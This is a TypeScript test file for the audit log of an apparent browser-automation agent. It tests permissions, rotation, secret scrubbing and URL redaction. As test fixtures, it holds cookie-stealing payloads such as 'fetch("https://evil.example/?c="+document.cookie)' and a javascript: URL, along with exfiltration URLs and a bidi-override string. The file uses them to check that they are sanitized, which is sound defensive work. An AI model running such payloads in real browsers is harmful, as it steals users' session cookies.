import { mkdtempSync, readFileSync, statSync, writeFileSync, existsSync, chmodSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { AUDIT_INTENT_MAX, AuditLog, redactUrlsIn, sanitizeEntry, scrubSecrets } from '../../src/safety/audit.js';
import { redactUrl } from '../../src/safety/text.js';

let dir: string;
beforeEach(() => {
  dir = mkdtempSync(join(tmpdir(), 'bh-audit-'));
});
afterEach(() => {
  rmSync(dir, { recursive: true, force: true });
});

const mode = (p: string): number => statSync(p).mode & 0o777;

describe('AuditLog', () => {
  it('creates parent dirs and a 0600 JSONL file with ts', async () => {
    const path = join(dir, 'nested', 'deeper', 'audit.log');
    const log = new AuditLog({ path, now: () => new Date('2026-10-29T12:00:00Z') });
    await log.append({ tool: 'click', outcome: 'ok', element: 'button "Send"' });
    expect(mode(path)).toBe(0o600);
    const lines = readFileSync(path, 'utf8').trim().split('\n');
    expect(lines).toHaveLength(1);
    expect(JSON.parse(lines[0]!)).toEqual({ tool: 'click', outcome: 'ok', element: 'button "Send"', ts: '2026-10-29T12:00:00.000Z' });
  });

  it('tightens permissions on an existing world-readable file', async () => {
    const path = join(dir, 'audit.log');
    writeFileSync(path, '');
    chmodSync(path, 0o644);
    await new AuditLog({ path }).append({ tool: 'x', outcome: 'ok' });
    expect(mode(path)).toBe(0o600);
  });

  it('keeps a caller-supplied ts', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    await log.append({ tool: 'x', outcome: 'ok', ts: '2020-01-01T00:00:00.000Z' });
    expect((await log.recent(1))[0]!.ts).toBe('2020-01-01T00:00:00.000Z');
  });

  it('drops secret-named keys defensively', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    await log.append({
      tool: 'type',
      outcome: 'ok',
      args: { text: '[3 chars] "abc"', password: 'hunter2', nested: { otp: '123456', cvv: '999', ok: 1, cardNumber: '4242' }, code: '1', keyCode: 13 },
    });
    const raw = readFileSync(path, 'utf8');
    for (const s of ['hunter2', '123456', '999', '4242']) expect(raw).not.toContain(s);
    const e = (await log.recent(1))[0]!;
    expect(e.args).toEqual({ text: '[3 chars]', nested: { ok: 1 }, keyCode: 13 });
  });

  it('recent() returns newest first and respects limit', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    for (let i = 0; i < 5; i++) await log.append({ tool: `t${i}`, outcome: 'ok' });
    expect((await log.recent(3)).map((e) => e.tool)).toEqual(['t4', 't3', 't2']);
    expect((await log.recent(100)).map((e) => e.tool)).toEqual(['t4', 't3', 't2', 't1', 't0']);
    expect(await log.recent(0)).toEqual([]);
  });

  it('recent() on a missing file is empty and skips malformed lines', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    expect(await log.recent(5)).toEqual([]);
    writeFileSync(path, '{"tool":"a","outcome":"ok","ts":"1"}\nnot json\n{"no":"ts"}\n{"tool":"b","outcome":"ok","ts":"2"}\n');
    expect((await log.recent(5)).map((e) => e.tool)).toEqual(['b', 'a']);
  });

  it('rotates past maxBytes keeping 3 old files, and recent() spans rotated files', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path, maxBytes: 300 });
    // each line is ~100 bytes → rotate every ~3 entries
    for (let i = 0; i < 30; i++) await log.append({ tool: `tool-${String(i).padStart(2, '0')}`, outcome: 'ok', intent: 'x'.repeat(40) });
    expect(existsSync(`${path}.1`)).toBe(true);
    expect(existsSync(`${path}.2`)).toBe(true);
    expect(existsSync(`${path}.3`)).toBe(true);
    expect(existsSync(`${path}.4`)).toBe(false);
    for (const p of [path, `${path}.1`, `${path}.2`, `${path}.3`]) {
      expect(statSync(p).size).toBeLessThanOrEqual(300);
      expect(mode(p)).toBe(0o600);
    }
    const recent = await log.recent(5);
    expect(recent.map((e) => e.tool)).toEqual(['tool-29', 'tool-28', 'tool-27', 'tool-26', 'tool-25']);
    const curCount = readFileSync(path, 'utf8').trim().split('\n').length;
    expect(curCount).toBeLessThan(5); // so recent(5) really did read rotated files too
  });

  it('concurrent appends are serialized (no lost or interleaved lines across rotation)', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path, maxBytes: 1000, keep: 3 });
    await Promise.all(Array.from({ length: 20 }, (_, i) => log.append({ tool: `c${i}`, outcome: 'ok' })));
    const all = await log.recent(1000);
    // every line must be intact JSON, newest first
    const tools = all.map((e) => e.tool);
    expect(tools[0]).toBe('c19');
    const nums = tools.map((t) => Number(t.slice(1)));
    expect([...nums].sort((a, b) => b - a)).toEqual(nums);
  });
});

describe('scrubSecrets', () => {
  it('handles arrays and depth', () => {
    expect(scrubSecrets([{ password: 'x', a: 1 }])).toEqual([{ a: 1 }]);
    expect(scrubSecrets('plain')).toBe('plain');
    let deep: Record<string, unknown> = { v: 1 };
    for (let i = 0; i < 10; i++) deep = { d: deep };
    expect(JSON.stringify(scrubSecrets(deep))).toContain('[truncated]');
  });
});

describe('R1: audit privacy', () => {
  it('redactUrl keeps origin + capped path, hides query/fragment/credentials', () => {
    expect(redactUrl('https://mail.google.com/mail/u/0/#inbox/FMfcgz')).toBe('https://mail.google.com/mail/u/0/#…');
    expect(redactUrl('https://x.test/reset?token=s3cr3t&u=me')).toBe('https://x.test/reset?…');
    expect(redactUrl('https://user:pw@x.test/a')).toBe('https://x.test/a');
    expect(redactUrl(`https://x.test/${'p'.repeat(200)}`).length).toBeLessThan(110);
    expect(redactUrl('about:blank')).toBe('about:blank');
    expect(redactUrl('javascript:fetch("//e/?"+document.cookie)')).toBe('javascript:…');
    expect(redactUrl('data:text/html,<b>secret</b>')).toBe('data:…');
    expect(redactUrl('not a url')).toBe('[unparsable URL, 9 chars]');
    expect(redactUrl('')).toBe('');
  });

  it('redactUrlsIn rewrites URLs inside free text', () => {
    expect(redactUrlsIn('opened https://evil.example/x?d=secret then left')).toBe('opened https://evil.example/x?… then left');
  });

  it('every entry written is sanitized (server entries too)', async () => {
    const path = join(dir, 'audit.log');
    const log = new AuditLog({ path });
    await log.append({
      tool: 'navigate',
      outcome: 'ok',
      urlBefore: 'https://mail.google.com/mail/u/0/#inbox/FMfcgzQ',
      urlAfter: 'https://script.google.com/macros/s/X/exec?d=Quarterly+numbers',
      intent: `exfil‮\u0007 to https://evil.example/?d=leak ${'z'.repeat(400)}`,
      element: 'button "Send‮"',
      error: 'failed at https://evil.example/?d=leak',
      args: {
        url: 'https://evil.example/?d=leak',
        expression: 'fetch("https://evil.example/?c="+document.cookie)',
        prompt_text: '[16 chars] "my secret…"',
        text: 'Dear Bob, the wire code is 991122',
        nested: { link: 'see https://evil.example/p?q=leak' },
      },
    });
    const raw = readFileSync(path, 'utf8');
    for (const leak of ['leak', 'Quarterly', 'FMfcgzQ', 'document.cookie', 'my secret', '991122', '‮', '\\u202e', '\\u0007']) {
      expect(raw, leak).not.toContain(leak);
    }
    const e = (await log.recent(1))[0]!;
    expect(e.urlBefore).toBe('https://mail.google.com/mail/u/0/#…');
    expect(e.urlAfter).toBe('https://script.google.com/macros/s/X/exec?…');
    expect([...e.intent!].length).toBeLessThanOrEqual(AUDIT_INTENT_MAX);
    expect(e.args).toMatchObject({
      url: 'https://evil.example/?…',
      expression: expect.stringMatching(/^\[\d+ chars, sha256:[0-9a-f]{12}\]$/),
      prompt_text: '[16 chars]',
      text: '[33 chars]', // length only (review #2 verification: no previews)
      nested: { link: 'see https://evil.example/p?…' },
    });
  });

  it('already-redacted values pass through unchanged', () => {
    const e = sanitizeEntry({
      ts: 't',
      tool: 'type',
      outcome: 'ok',
      args: { text: '[redacted, 7 chars]', expression: '[14 chars, sha256:a37bf3152178]', files: ['/Users/me/a.pdf'] },
    });
    expect(e.args).toEqual({ text: '[redacted, 7 chars]', expression: '[14 chars, sha256:a37bf3152178]', files: ['/Users/me/a.pdf'] });
  });
});
